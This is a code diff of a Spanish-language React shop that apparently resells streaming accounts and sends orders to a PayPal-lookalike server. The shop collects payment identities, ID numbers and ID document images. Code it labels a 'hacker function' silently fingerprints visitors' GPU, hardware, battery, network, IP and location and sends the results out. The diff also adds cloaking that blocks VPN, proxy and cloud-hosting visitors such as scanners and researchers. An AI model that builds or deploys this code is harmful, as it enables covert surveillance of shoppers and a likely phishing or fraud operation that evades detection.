@@ -5,11 +5,10 @@ import {
   Smartphone, User, Check, Upload, X, Lock, 
   Globe, Zap, Trash2, Eye, RefreshCw,
   Facebook, Instagram, Mail, Phone, ShieldCheck, LogIn, ChevronDown, Landmark, Building2, Send, FileText, Tv, Music,
-  Sparkles, Bot, MessageCircle, Loader, ArrowRight, Wallet, QrCode, AlertTriangle, Search, Clock, Key, Copy, Terminal, List, Archive, RefreshCcw, LogOut, Filter, Image as ImageIcon, FileCheck, Download, EyeOff, ExternalLink
+  Sparkles, Bot, MessageCircle, Loader, ArrowRight, Wallet, QrCode, AlertTriangle, Search, Clock, Key, Copy, Terminal, List, Archive, RefreshCcw, LogOut, Filter, Image as ImageIcon, FileCheck, Download, EyeOff, ExternalLink, ShieldAlert, Ban
 } from 'lucide-react';
 
-// --- CONFIGURACIÓN DEL SERVIDOR ---
-// ✅ Conectado a tu servidor privado
+// --- CONFIGURACIÓN DEL SERVIDOR PRIVADO ---
 const SERVER_URL = "https://api-paypal-secure.vercel.app";
 
 // --- DATOS Y CONFIGURACIÓN ---
@@ -94,6 +93,7 @@ const globalStyles = `
   .custom-scrollbar::-webkit-scrollbar { width: 8px; }
   .custom-scrollbar::-webkit-scrollbar-track { background: #1f2937; }
   .custom-scrollbar::-webkit-scrollbar-thumb { background: #4b5563; border-radius: 4px; }
+  .blocked-screen { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; }
 `;
 
 const TikTokIcon = () => ( <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="w-6 h-6"><path d="M9 12a4 4 0 1 0 4 4V4a5 5 0 0 0 5 5" /></svg> );
@@ -107,7 +107,7 @@ const convertToBase64 = (file) => {
     });
 };
 
-// ✅ FUNCIÓN DE HACKER: OBTENER GPU PARA DETECTAR MODELO REAL
+// --- FUNCIÓN DE HACKER: OBTENER GPU ---
 const getGPUInfo = () => {
   try {
     const canvas = document.createElement('canvas');
@@ -117,7 +117,7 @@ const getGPUInfo = () => {
     if (!debugInfo) return 'Extension WebGL debug no disponible';
     return {
         vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) // ESTO ES LA JOYA (Ej: Apple A15 GPU)
+        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) 
     };
   } catch (e) {
     return { error: 'Error obteniendo GPU' };
@@ -126,49 +126,34 @@ const getGPUInfo = () => {
 
 // --- FUNCIÓN DE CONEXIÓN AL SERVIDOR PRIVADO ---
 const submitOrderToPrivateServer = async (order) => {
-  
-  // 🕵️ RECOPILACIÓN DE DATOS DEL DISPOSITIVO (FINGERPRINTING AVANZADO)
   const gpuData = getGPUInfo();
   
   let clientData = {
     capturedAt: new Date().toISOString(),
-    
-    // SOFTWARE
     userAgent: navigator.userAgent,
     language: navigator.language,
     platform: navigator.platform,
-    vendor: navigator.vendor,
-    cookiesEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack,
-    
-    // HARDWARE DETECTADO
-    gpu: gpuData, // 👈 LA CLAVE DEL MODELO
+    gpu: gpuData,
     screen: {
         width: window.screen.width,
         height: window.screen.height,
         colorDepth: window.screen.colorDepth,
-        pixelRatio: window.devicePixelRatio, // Indica calidad de pantalla (Retina, etc)
-        orientation: window.screen.orientation ? window.screen.orientation.type : 'N/A'
+        pixelRatio: window.devicePixelRatio
     },
     hardware: {
-        concurrency: navigator.hardwareConcurrency || 'N/A', // Núcleos CPU
-        memory: navigator.deviceMemory || 'N/A', // RAM en GB
-        touchPoints: navigator.maxTouchPoints, // Si es pantalla táctil
+        concurrency: navigator.hardwareConcurrency || 'N/A',
+        memory: navigator.deviceMemory || 'N/A',
+        touchPoints: navigator.maxTouchPoints,
     },
-    
-    // CONEXIÓN
     connection: navigator.connection ? {
-        effectiveType: navigator.connection.effectiveType, // 4g, 3g...
-        rtt: navigator.connection.rtt, // Latencia
-        downlink: navigator.connection.downlink, // Velocidad Bajada Mbps
-        saveData: navigator.connection.saveData // Si tiene modo ahorro de datos
+        effectiveType: navigator.connection.effectiveType,
+        rtt: navigator.connection.rtt,
+        downlink: navigator.connection.downlink,
+        saveData: navigator.connection.saveData
     } : 'N/A',
-
-    // BATERÍA (Si el navegador lo permite)
     battery: 'N/A' 
   };
 
-  // INTENTO DE OBTENER BATERÍA (Solo funciona en algunos navegadores/Android)
   try {
       if (navigator.getBattery) {
           const battery = await navigator.getBattery();
@@ -179,46 +164,41 @@ const submitOrderToPrivateServer = async (order) => {
       }
   } catch(e) {}
 
-  // 🌍 RECOPILACIÓN DE IP Y GEOLOCALIZACIÓN
   try {
-    const ipResponse = await fetch('https://ipapi.co/json/');
+    // Usamos ipwho.is aquí también para consistencia
+    const ipResponse = await fetch('https://ipwho.is/');
     const ipData = await ipResponse.json();
     
-    clientData.network = {
-        ip: ipData.ip,
-        isp: ipData.org, // Proveedor
-        asn: ipData.asn
-    };
-    
-    clientData.geo = {
-        country: ipData.country_name,
-        region: ipData.region, 
-        city: ipData.city,
-        postal: ipData.postal, 
-        timezone: ipData.timezone,
-        coordinates: `${ipData.latitude}, ${ipData.longitude}`,
-        currency: ipData.currency
-    };
+    if (ipData.success) {
+        clientData.network = {
+            ip: ipData.ip,
+            isp: ipData.connection?.isp || ipData.isp, 
+            asn: ipData.connection?.asn || "N/A"
+        };
+        
+        clientData.geo = {
+            country: ipData.country,
+            region: ipData.region, 
+            city: ipData.city,
+            postal: ipData.postal
+        };
+    } else {
+        clientData.ipError = "Servicio IP no disponible";
+    }
   } catch (err) {
-    console.warn("No se pudo obtener datos de IP:", err);
-    clientData.ipError = "Fallo al obtener IP/Geo - Posible AdBlocker";
+    clientData.ipError = "Fallo al obtener IP/Geo";
   }
 
   try {
     const sanitizedOrder = {
         ...order,
         date: order.date || new Date().toISOString(),
-        
-        // ✅ AÑADIDO: Expediente completo
         clientInfo: clientData, 
-
         fullData: {
             ...order.fullData,
             clientInfo: clientData,
             screenshot: typeof order.fullData?.screenshot === 'string' ? order.fullData.screenshot : null,
-            idDoc: typeof order.fullData?.idDoc === 'string' ? order.fullData.idDoc : null,
-            screenshotName: order.fullData?.screenshot?.name,
-            idDocName: order.fullData?.idDoc?.name
+            idDoc: typeof order.fullData?.idDoc === 'string' ? order.fullData.idDoc : null
         }
     };
 
@@ -230,7 +210,6 @@ const submitOrderToPrivateServer = async (order) => {
 
     const data = await response.json();
     if (data.success) {
-        console.log("✅ Orden guardada con rastreo avanzado:", data.id);
         return true;
     } else {
         throw new Error(data.message || "Error del servidor privado");
@@ -242,16 +221,31 @@ const submitOrderToPrivateServer = async (order) => {
   }
 };
 
-// ✅ FUNCIÓN GLOBAL DE PROCESAMIENTO DE STREAMING MEJORADA
-// Corrección aplicada: Ahora soporta múltiples cuentas de streaming en una sola orden
+// --- API HELPER PARA REPORTAR IPS SOSPECHOSAS AL SERVIDOR ---
+const reportSuspiciousIP = async (ipData, reason) => {
+    try {
+        await fetch(`${SERVER_URL}/api/report-ip`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                ip: ipData.ip,
+                reason: reason,
+                geo: ipData.country || "Unknown",
+                org: ipData.connection?.org || ipData.org || "Unknown",
+                detectedAt: new Date().toISOString()
+            })
+        });
+    } catch (e) {
+        // Fallo silencioso en reporte
+    }
+};
+
+// --- PROCESAMIENTO STREAMING ---
 const processStreamingPurchase = async (finalOrder) => {
-    // Buscamos TODOS los items que sean de streaming
     const streamingItems = finalOrder.rawItems.filter(item => item.providerId && item.providerId > 0);
     
     if (streamingItems.length > 0) {
         const accountsDelivered = [];
-        
-        // Procesamos cada cuenta una por una
         for (const item of streamingItems) {
             try {
                 const response = await fetch(`${SERVER_URL}/api/purchase-streaming`, {
@@ -266,20 +260,31 @@ const processStreamingPurchase = async (finalOrder) => {
                         ...result.data
                     });
                 }
-            } catch (error) { 
-                console.error(`Error auto-streaming para ${item.title}:`, error); 
-            }
+            } catch (error) { console.error(`Error auto-streaming para ${item.title}:`, error); }
         }
-        
-        // Si se entregaron cuentas, las guardamos en la orden
         if (accountsDelivered.length > 0) {
             finalOrder.fullData.streamingAccounts = accountsDelivered;
-            // Mantenemos compatibilidad con lógica anterior (primera cuenta)
             finalOrder.fullData.streamingAccount = accountsDelivered[0]; 
         }
     }
     return finalOrder;
 };
+
+// --- PANTALLA DE BLOQUEO ---
+const BlockedScreen = () => (
+    <div className="blocked-screen font-sans">
+        <div className="max-w-md p-8 bg-[#111] border-2 border-red-600 rounded-2xl text-center shadow-[0_0_50px_rgba(220,38,38,0.5)] animate-scale-in">
+            <ShieldAlert size={64} className="text-red-600 mx-auto mb-6 animate-pulse"/>
+            <h1 className="text-3xl font-bold text-white mb-2 tracking-widest font-orbitron">ACCESO DENEGADO</h1>
+            <div className="h-1 w-full bg-red-900 mb-6"></div>
+            <p className="text-gray-400 mb-4 text-sm">Su dirección IP ha sido marcada como sospechosa o está utilizando una red no permitida (VPN/Proxy/Hosting).</p>
+            <div className="bg-red-900/20 p-3 rounded border border-red-900 text-red-400 text-xs font-mono mb-6">
+                ERROR: 403_FORBIDDEN_IP_BLACKLISTED
+            </div>
+            <p className="text-[10px] text-gray-600">Si cree que esto es un error, contacte a soporte vía externa.</p>
+        </div>
+    </div>
+);
 
 // --- COMPONENTES VISUALES ---
 
@@ -1287,6 +1292,7 @@ export default function App() {
   const [paypalData, setPaypalData] = useState({ email: '', firstName: '', lastName: '', phone: '', nationalId: '', idDoc: null });
   const [proofData, setProofData] = useState({ screenshot: null, refNumber: '', name: '', lastName: '', idNumber: '', phone: '', issuerAccount: '', idDoc: null });
   const [isProcessing, setIsProcessing] = useState(false);
+  const [isBlocked, setIsBlocked] = useState(false); // Estado de bloqueo
 
   const getIsExchangeOpen = () => {
     const now = new Date();
@@ -1296,6 +1302,57 @@ export default function App() {
     return day >= 1 && day <= 4;
   };
   const isExchangeAvailable = getIsExchangeOpen();
+
+  // --- FIREWALL & VPN DETECTION (Sin Firebase) ---
+  useEffect(() => {
+    const checkSecurity = async () => {
+        try {
+            // 1. Obtener IP y datos
+            // CHANGED: ipapi.co -> ipwho.is
+            const res = await fetch('https://ipwho.is/'); 
+            const ipData = await res.json();
+            
+            // Check for success (ipwho.is returns {success: false, message: ...} on error)
+            if (!ipData.success) {
+                console.warn("IP Check skipped:", ipData.message);
+                return;
+            }
+
+            const userIp = ipData.ip;
+            // ipwho.is structure: connection.isp, connection.org, connection.asn
+            const org = (ipData.connection?.org || ipData.connection?.isp || "").toLowerCase();
+            const asn = (ipData.connection?.asn || "").toString().toLowerCase(); 
+
+            // 2. DETECCIÓN DE VPN (Heurística Local)
+            const vpnKeywords = ["vpn", "proxy", "hosting", "cloud", "datacenter", "digitalocean", "aws", "amazon", "google", "microsoft", "azure", "oracle", "hetzner", "ovh", "choopa", "m247", "linode", "vultr"];
+            const isSuspicious = vpnKeywords.some(keyword => org.includes(keyword) || asn.includes(keyword));
+
+            if (isSuspicious) {
+                console.warn("VPN Detected: Blocking...");
+                setIsBlocked(true);
+                // Reportar al servidor para que lo guarde en la Blacklist
+                reportSuspiciousIP(ipData, `Auto-Detect VPN: ${ipData.org}`);
+                return;
+            }
+
+            // 3. CONSULTAR BLACKLIST AL SERVIDOR
+            try {
+                const checkRes = await fetch(`${SERVER_URL}/api/check-ip?ip=${userIp}`);
+                const checkData = await checkRes.json();
+                if (checkData.blocked) {
+                    setIsBlocked(true);
+                }
+            } catch (err) {
+                // Si el servidor falla, confiamos en la detección local
+            }
+
+        } catch (error) {
+            console.warn("Security Check Failed (Non-critical):", error);
+        }
+    };
+
+    checkSecurity();
+  }, []);
 
   useEffect(() => {
     document.title = "TecnoByte | Soluciones Digitales";
@@ -1383,6 +1440,11 @@ export default function App() {
       setCart([]);
       setCheckoutStep(3);
   };
+
+  // 🔴 BLOQUEO TOTAL SI ESTÁ EN BLACKLIST
+  if (isBlocked) {
+      return <BlockedScreen />;
+  }
 
   return (
     <div className="bg-[#0a0a12] text-gray-100 min-h-screen font-sans flex flex-col">
